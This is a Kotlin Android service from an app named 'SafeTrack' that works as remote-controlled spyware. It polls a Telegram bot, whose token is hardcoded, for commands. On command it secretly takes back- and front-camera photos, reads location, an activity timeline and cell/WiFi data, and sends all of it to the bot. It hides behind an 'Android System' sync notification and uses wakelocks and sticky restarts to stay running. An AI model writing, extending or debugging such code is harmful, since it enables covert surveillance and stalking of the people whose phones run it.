package com.example.safetrack

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class PersistentSyncService : LifecycleService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastUpdateId = -1L

    // Held briefly while capturing a photo so the device does not doze
    // mid-capture when the app is in the background.
    private var cameraWakeLock: PowerManager.WakeLock? = null

    private fun fetchDeviceIdentifier(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        startForegroundCompat()
        startPolling()
        return START_STICKY
    }

    /**
     * Start foreground with the correct service type for Android 14+ (UPSIDE_DOWN_CAKE).
     * Without this, startForeground() throws MissingForegroundServiceTypeException
     * and the service is killed, which is why camera capture silently failed
     * when the app was in the background.
     */
    private fun startForegroundCompat() {
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+: must declare at least one service type at runtime
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            } else {
                @Suppress("DEPRECATION")
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            }
            startForeground(1, notification, type)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            @Suppress("DEPRECATION")
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1, notification)
        }
    }

    private fun startPolling() {
        serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    val botToken = "8961320031:AAGWyCdW9CziarfEF8p3ynltYOsMWUirxNw"
                    val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}"

                    val url = URL(urlString)
                    val connection = url.openConnection as HttpURLConnection
                    connection.connectTimeout = 10000
                    connection.readTimeout = 10000

                    val response = connection.inputStream.bufferedReader().use { it.readText() }
                    connection.disconnect()

                    val json = JSONObject(response)
                    var delayTime = 2000L

                    if (json.getBoolean("ok")) {
                        val updates = json.getJSONArray("result")
                        var maxUpdateId = lastUpdateId
                        for (i in 0 until updates.length()) {
                            val update = updates.getJSONObject(i)
                            val currentUpdateId = update.getLong("update_id")
                            if (currentUpdateId > maxUpdateId) {
                                maxUpdateId = currentUpdateId
                            }
                            if (update.has("message")) {
                                val message = update.getJSONObject("message")
                                if (message.has("text")) {
                                    val text = message.getString("text")
                                    when (text) {
                                        "/photo" -> handlePhotoCommand(CameraUtility.LensFacing.BACK, "📷 *Back Camera Photo*")
                                        "/selfie" -> handlePhotoCommand(CameraUtility.LensFacing.FRONT, "🤳 *Front Camera Photo*")
                                        "/p" -> handleActivityLogCommand()
                                        "/cell" -> handleCellCommand()
                                    }
                                }
                            }
                        }
                        lastUpdateId = maxUpdateId
                    }
                    delay(delayTime)
                } catch (e: Exception) {
                    Log.e("PersistentSyncService", "Polling error", e)
                    delay(5000)
                }
            }
        }
    }

    /**
     * Photo capture entry point. Runs on the service's main lifecycleScope so
     * the LifecycleOwner stays STARTED while the camera is bound - this is
     * the root cause of background-only photo failures before this change.
     *
     * Acquires a short WakeLock so the device does not doze before the
     * camera callback fires.
     */
    private fun handlePhotoCommand(lens: CameraUtility.LensFacing, captionPrefix: String) {
        lifecycleScope.launch {
            try {
                acquireCameraWakeLock()
                // Move camera call off main thread but resume on main for binding
                val photoFile = withContext(Dispatchers.Main) {
                    CameraUtility.get().capturePhoto(this@PersistentSyncService, lens)
                }
                val latLon = LocationTracker.getCurrentLocation(this@PersistentSyncService)
                val locStr = latLon?.let { "${it.first}, ${it.second}" } ?: "unknown"
                TelegramSyncHelper.sendPhoto(
                    photoFile,
                    "$captionPrefix\n📍 Location: $locStr"
                )
            } catch (e: Exception) {
                Log.e("PersistentSyncService", "Camera error", e)
                TelegramSyncHelper.sendLogData("❌ *Camera Error:* ${e.message}")
            } finally {
                releaseCameraWakeLock()
            }
        }
    }

    private fun handleActivityLogCommand() {
        lifecycleScope.launch {
            val latLon = LocationTracker.getCurrentLocation(this@PersistentSyncService)
            val latStr = latLon?.first?.toString() ?: "0"
            val lngStr = latLon?.second?.toString() ?: "0"
            val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
            TelegramSyncHelper.sendDebugLog(
                this@PersistentSyncService, latStr, lngStr,
                "📊 *Device Activity Log:*\n\n$timeline"
            )
        }
    }

    private fun handleCellCommand() {
        lifecycleScope.launch {
            val latLon = LocationTracker.getCurrentLocation(this@PersistentSyncService)
            val latStr = latLon?.first?.toString() ?: "0"
            val lngStr = latLon?.second?.toString() ?: "0"
            val cellData = NetworkLocationUtility.getNetworkLocationInfo(this@PersistentSyncService)
            TelegramSyncHelper.sendDebugLog(
                this@PersistentSyncService, latStr, lngStr,
                "📡 *Cell/WiFi Diagnostic:*\n\n$cellData"
            )
        }
    }

    private fun acquireCameraWakeLock() {
        try {
            if (cameraWakeLock?.isHeld == true) return
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            cameraWakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SafeTrack::CameraCapture"
            ).apply {
                setReferenceCounted(false)
                acquire(15_000L) // hard cap: 15s safety timeout
            }
        } catch (e: Exception) {
            Log.w("PersistentSyncService", "wakelock acquire failed: ${e.message}")
        }
    }

    private fun releaseCameraWakeLock() {
        try {
            cameraWakeLock?.let { if (it.isHeld) it.release() }
        } catch (e: Exception) {
            Log.w("PersistentSyncService", "wakelock release failed: ${e.message}")
        }
        cameraWakeLock = null
    }

    private fun createNotification(): Notification {
        val channelId = "sync_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "System Sync", NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val openIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val contentPendingIntent = PendingIntent.getActivity(
            this, 0, openIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Android System")
            .setContentText("Syncing device state...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setContentIntent(contentPendingIntent)
            .build()
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        releaseCameraWakeLock()
        // Explicitly release camera resources to prevent "Camera is closed" on subsequent calls
        CameraUtility.get().shutdown()
    }
}
